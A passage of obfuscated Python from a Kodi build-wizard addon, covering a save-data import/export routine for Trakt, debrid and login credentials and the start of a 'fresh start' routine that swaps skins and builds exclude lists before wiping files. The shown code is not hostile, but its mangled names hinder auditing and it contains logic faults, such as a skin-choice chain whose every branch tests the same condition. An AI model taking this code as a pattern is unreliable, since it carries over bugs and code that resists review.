		for OOOOO0OO0000000OO in O0O0O0O0O00OO0OOO :#line:4449
			if not 'xbmc.python'in OOOOO0OO0000000OO :#line:4450
				O0O0O0O0O0OOO0000 .append (OOOOO0OO0000000OO )#line:4451
		return O0O0O0O0O0OOO0000 #line:4452
	return []#line:4453
def manageSaveData (O000000OO0O0O00OO ):#line:4455
	if O000000OO0O0O00OO =='import':#line:4456
		O0O0O00O0O0O0O0O0 =os .path .join (ADDONDATA ,'temp')#line:4457
		if not os .path .exists (O0O0O00O0O0O0O0O0 ):os .makedirs (O0O0O00O0O0O0O0O0 )#line:4458
		OOO0O0OO0000000OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4459
		if not OOO0O0OO0000000OO .endswith ('.zip'):#line:4460
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4461
			return #line:4462
		OOO0O0000O0OO0O0O =os .path .join (MYBUILDS ,'SaveData.zip')#line:4463
		O000000OOOO00O00O =xbmcvfs .copy (OOO0O0OO0000000OO ,OOO0O0000O0OO0O0O )#line:4464
		wiz .log ("%s"%str (O000000OOOO00O00O ))#line:4465
		extract .all (xbmc .translatePath (OOO0O0000O0OO0O0O ),O0O0O00O0O0O0O0O0 )#line:4466
		OOOOO00000OOOOOOO =os .path .join (O0O0O00O0O0O0O0O0 ,'trakt')#line:4467
		O00OO0OO00O0O0OO0 =os .path .join (O0O0O00O0O0O0O0O0 ,'login')#line:4468
		OOO00O00O0000000O =os .path .join (O0O0O00O0O0O0O0O0 ,'debrid')#line:4469
		OOOOO00OO0OO00O0O =0 #line:4470
		if os .path .exists (OOOOO00000OOOOOOO ):#line:4471
			OOOOO00OO0OO00O0O +=1 #line:4472
			OOO000O00OO00O0O0 =os .listdir (OOOOO00000OOOOOOO )#line:4473
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4474
			for OOOO0OOOOO00O000O in OOO000O00OO00O0O0 :#line:4475
				OOO0O0O0OOO00OO0O =os .path .join (traktit .TRAKTFOLD ,OOOO0OOOOO00O000O )#line:4476
				O00000000O00O0O00 =os .path .join (OOOOO00000OOOOOOO ,OOOO0OOOOO00O000O )#line:4477
				if os .path .exists (OOO0O0O0OOO00OO0O ):#line:4478
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0OOOOO00O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4479
					else :os .remove (OOO0O0O0OOO00OO0O )#line:4480
				shutil .copy (O00000000O00O0O00 ,OOO0O0O0OOO00OO0O )#line:4481
			traktit .importlist ('all')#line:4482
			traktit .traktIt ('restore','all')#line:4483
		if os .path .exists (O00OO0OO00O0O0OO0 ):#line:4484
			OOOOO00OO0OO00O0O +=1 #line:4485
			OOO000O00OO00O0O0 =os .listdir (O00OO0OO00O0O0OO0 )#line:4486
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4487
			for OOOO0OOOOO00O000O in OOO000O00OO00O0O0 :#line:4488
				OOO0O0O0OOO00OO0O =os .path .join (loginit .LOGINFOLD ,OOOO0OOOOO00O000O )#line:4489
				O00000000O00O0O00 =os .path .join (O00OO0OO00O0O0OO0 ,OOOO0OOOOO00O000O )#line:4490
				if os .path .exists (OOO0O0O0OOO00OO0O ):#line:4491
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0OOOOO00O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4492
					else :os .remove (OOO0O0O0OOO00OO0O )#line:4493
				shutil .copy (O00000000O00O0O00 ,OOO0O0O0OOO00OO0O )#line:4494
			loginit .importlist ('all')#line:4495
			loginit .loginIt ('restore','all')#line:4496
		if os .path .exists (OOO00O00O0000000O ):#line:4497
			OOOOO00OO0OO00O0O +=1 #line:4498
			OOO000O00OO00O0O0 =os .listdir (OOO00O00O0000000O )#line:4499
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4500
			for OOOO0OOOOO00O000O in OOO000O00OO00O0O0 :#line:4501
				OOO0O0O0OOO00OO0O =os .path .join (debridit .REALFOLD ,OOOO0OOOOO00O000O )#line:4502
				O00000000O00O0O00 =os .path .join (OOO00O00O0000000O ,OOOO0OOOOO00O000O )#line:4503
				if os .path .exists (OOO0O0O0OOO00OO0O ):#line:4504
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0OOOOO00O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4505
					else :os .remove (OOO0O0O0OOO00OO0O )#line:4506
				shutil .copy (O00000000O00O0O00 ,OOO0O0O0OOO00OO0O )#line:4507
			debridit .importlist ('all')#line:4508
			debridit .debridIt ('restore','all')#line:4509
		wiz .cleanHouse (O0O0O00O0O0O0O0O0 )#line:4510
		wiz .removeFolder (O0O0O00O0O0O0O0O0 )#line:4511
		os .remove (OOO0O0000O0OO0O0O )#line:4512
		if OOOOO00OO0OO00O0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4513
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4514
	elif O000000OO0O0O00OO =='export':#line:4515
		OO0000000O000O0OO =xbmc .translatePath (MYBUILDS )#line:4516
		O0OO000OOO0O00OO0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4517
		traktit .traktIt ('update','all')#line:4518
		loginit .loginIt ('update','all')#line:4519
		debridit .debridIt ('update','all')#line:4520
		OOO0O0OO0000000OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4521
		OOO0O0OO0000000OO =xbmc .translatePath (OOO0O0OO0000000OO )#line:4522
		OOO00O000O00O000O =os .path .join (OO0000000O000O0OO ,'SaveData.zip')#line:4523
		OOOO000O0O0OO0O00 =zipfile .ZipFile (OOO00O000O00O000O ,mode ='w')#line:4524
		for O0OO0OOOO00O00O0O in O0OO000OOO0O00OO0 :#line:4525
			if os .path .exists (O0OO0OOOO00O00O0O ):#line:4526
				OOO000O00OO00O0O0 =os .listdir (O0OO0OOOO00O00O0O )#line:4527
				for O00O000O0OOOOO0O0 in OOO000O00OO00O0O0 :#line:4528
					OOOO000O0O0OO0O00 .write (os .path .join (O0OO0OOOO00O00O0O ,O00O000O0OOOOO0O0 ),os .path .join (O0OO0OOOO00O00O0O ,O00O000O0OOOOO0O0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4529
		OOOO000O0O0OO0O00 .close ()#line:4530
		if OOO0O0OO0000000OO ==OO0000000O000O0OO :#line:4531
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O000O00O000O ))#line:4532
		else :#line:4533
			try :#line:4534
				xbmcvfs .copy (OOO00O000O00O000O ,os .path .join (OOO0O0OO0000000OO ,'SaveData.zip'))#line:4535
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOO0O0OO0000000OO ,'SaveData.zip')))#line:4536
			except :#line:4537
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O000O00O000O ))#line:4538
def freshStart (install =None ,over =False ):#line:4543
	if USERNAME =='':#line:4544
		ADDON .openSettings ()#line:4545
		sys .exit ()#line:4546
	O00OO00OO00O0O00O =u_list (SPEEDFILE )#line:4547
	(O00OO00OO00O0O00O )#line:4548
	OOO00O0OOO0O00OO0 =(wiz .workingURL (O00OO00OO00O0O00O ))#line:4549
	(OOO00O0OOO0O00OO0 )#line:4550
	if KEEPTRAKT =='true':#line:4551
		traktit .autoUpdate ('all')#line:4552
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4553
	if KEEPREAL =='true':#line:4554
		debridit .autoUpdate ('all')#line:4555
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4556
	if KEEPLOGIN =='true':#line:4557
		loginit .autoUpdate ('all')#line:4558
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4559
	if over ==True :OOOOO00OOO000O0O0 =1 #line:4560
	elif install =='restore':OOOOO00OOO000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4561
	elif install :OOOOO00OOO000O0O0 =1 #line:4562
	else :OOOOO00OOO000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4563
	if OOOOO00OOO000O0O0 :#line:4564
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4565
			O00OOO00OOOO00O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4566
			skinSwitch .swapSkins (O00OOO00OOOO00O00 )#line:4569
			O0OOOO0OOOOOOOO00 =0 #line:4570
			xbmc .sleep (1000 )#line:4571
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOOO0OOOOOOOO00 <150 :#line:4572
				O0OOOO0OOOOOOOO00 +=1 #line:4573
				xbmc .sleep (1000 )#line:4574
				wiz .ebi ('SendAction(Select)')#line:4575
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4576
				wiz .ebi ('SendClick(11)')#line:4577
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4578
			xbmc .sleep (1000 )#line:4579
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4580
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4581
			return #line:4582
		wiz .addonUpdates ('set')#line:4583
		O00000OOO000O0O0O =os .path .abspath (HOME )#line:4584
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4585
		O0O0OO0OO0O0OOO0O =sum ([len (OOOOOOOO00OO00O00 )for O000O00O00OO0OOOO ,O000000OO0OO00OOO ,OOOOOOOO00OO00O00 in os .walk (O00000OOO000O0O0O )]);OOO00OO0OOO00O0O0 =0 #line:4586
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4587
		EXCLUDES .append ('My_Builds')#line:4588
		EXCLUDES .append ('archive_cache')#line:4589
		EXCLUDES .append ('script.module.requests')#line:4590
		EXCLUDES .append ('myfav.anon')#line:4591
		if KEEPREPOS =='true':#line:4592
			O0OO0OO0O0O0O0OOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4593
			for O0OO0O00OO00O0O0O in O0OO0OO0O0O0O0OOO :#line:4594
				OOO0OO00O00000O0O =os .path .split (O0OO0O00OO00O0O0O [:-1 ])[1 ]#line:4595
				if not OOO0OO00O00000O0O ==EXCLUDES :#line:4596
					EXCLUDES .append (OOO0OO00O00000O0O )#line:4597
		if KEEPSUPER =='true':#line:4598
			EXCLUDES .append ('plugin.program.super.favourites')#line:4599
		if KEEPMOVIELIST =='true':#line:4600
			EXCLUDES .append ('plugin.video.metalliq')#line:4601
		if KEEPMOVIELIST =='true':#line:4602
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4603
		if KEEPADDONS =='true':#line:4604
			EXCLUDES .append ('addons')#line:4605
		if KEEPADDONS =='true':#line:4606
			EXCLUDES .append ('addon_data')#line:4607
		EXCLUDES .append ('plugin.video.elementum')#line:4610
		EXCLUDES .append ('script.elementum.burst')#line:4611
		EXCLUDES .append ('script.elementum.burst-master')#line:4612
		EXCLUDES .append ('plugin.video.quasar')#line:4613
		EXCLUDES .append ('script.quasar.burst')#line:4614
		EXCLUDES .append ('skin.estuary')#line:4615
		if KEEPWHITELIST =='true':#line:4618
			OOO000OOO000000O0 =''#line:4619
			OO0OOOOOO00O00OOO =wiz .whiteList ('read')#line:4620
			if len (OO0OOOOOO00O00OOO )>0 :#line:4621
				for O0OO0O00OO00O0O0O in OO0OOOOOO00O00OOO :#line:4622
					try :O00000000000O00O0 ,OO0OOO0000O000O00 ,OOOOOO0O0OOO00O00 =O0OO0O00OO00O0O0O #line:4623
					except :pass #line:4624
					if OOOOOO0O0OOO00O00 .startswith ('pvr'):OOO000OOO000000O0 =OO0OOO0000O000O00 #line:4625
					OO000OO0OOO0O000O =dependsList (OOOOOO0O0OOO00O00 )#line:4626
					for O0OOO0000000O00OO in OO000OO0OOO0O000O :#line:4627
						if not O0OOO0000000O00OO in EXCLUDES :#line:4628
							EXCLUDES .append (O0OOO0000000O00OO )#line:4629
						O00O0O00OO0OO00O0 =dependsList (O0OOO0000000O00OO )#line:4630
						for OO00OO0O000000O00 in O00O0O00OO0OO00O0 :#line:4631
							if not OO00OO0O000000O00 in EXCLUDES :#line:4632
								EXCLUDES .append (OO00OO0O000000O00 )#line:4633
					if not OOOOOO0O0OOO00O00 in EXCLUDES :#line:4634
						EXCLUDES .append (OOOOOO0O0OOO00O00 )#line:4635
				if not OOO000OOO000000O0 =='':wiz .setS ('pvrclient',OOOOOO0O0OOO00O00 )#line:4636
		if wiz .getS ('pvrclient')=='':#line:4637
			for O0OO0O00OO00O0O0O in EXCLUDES :#line:4638
				if O0OO0O00OO00O0O0O .startswith ('pvr'):#line:4639
					wiz .setS ('pvrclient',O0OO0O00OO00O0O0O )#line:4640
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4641
		O0O00OO0O0OO0000O =wiz .latestDB ('Addons')#line:4642
		for OO00OO0OO0OOO000O ,OO00000OO00O00O00 ,OO0OO00000O00O00O in os .walk (O00000OOO000O0O0O ,topdown =True ):#line:4643
			OO00000OO00O00O00 [:]=[OO0OO0OOO00O00O00 for OO0OO0OOO00O00O00 in OO00000OO00O00O00 if OO0OO0OOO00O00O00 not in EXCLUDES ]#line:4644
			for O00000000000O00O0 in OO0OO00000O00O00O :#line:4645
				OOO00OO0OOO00O0O0 +=1 #line:4646
				OOOOOO0O0OOO00O00 =OO00OO0OO0OOO000O .replace ('/','\\').split ('\\')#line:4647
				O0OOOO0OOOOOOOO00 =len (OOOOOO0O0OOO00O00 )-1 #line:4649
				if OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4650
				elif O00000000000O00O0 =='MyVideos99.db'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4651
				elif O00000000000O00O0 =='MyVideos107.db'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4652
				elif O00000000000O00O0 =='MyVideos116.db'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4653
				elif O00000000000O00O0 =='MyVideos99.db'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4654
				elif O00000000000O00O0 =='MyVideos107.db'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4655
				elif O00000000000O00O0 =='MyVideos116.db'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4656
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4657
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4658
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'skin.Premium.mod'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4659
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4660
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'skin.phenomenal'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4661
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4662
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'skin.titan'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4664
				elif OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4665
				elif O00000000000O00O0 =='sources.xml'and OOOOOO0O0OOO00O00 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4667
				elif O00000000000O00O0 =='quicknav.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4670
				elif O00000000000O00O0 =='x1101.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4671
				elif O00000000000O00O0 =='b-srtym-b.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4672
				elif O00000000000O00O0 =='x1102.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4673
				elif O00000000000O00O0 =='b-sdrvt-b.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4674
				elif O00000000000O00O0 =='x1112.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4675
				elif O00000000000O00O0 =='b-tlvvyzyh-b.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4676
				elif O00000000000O00O0 =='x1111.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4677
				elif O00000000000O00O0 =='b-tvknyshrly-b.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4678
				elif O00000000000O00O0 =='x1110.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4679
				elif O00000000000O00O0 =='b-yldym-b.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4680
				elif O00000000000O00O0 =='x1114.DATA.xml'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -2 ]=='userdata'and OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOO0O0OOO00O00 [O0OOOO0OOOOOOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO00OO0OO0OOO000O ,O00000000000O00O0 ),xbmc .LOGNOTICE )#line:4681
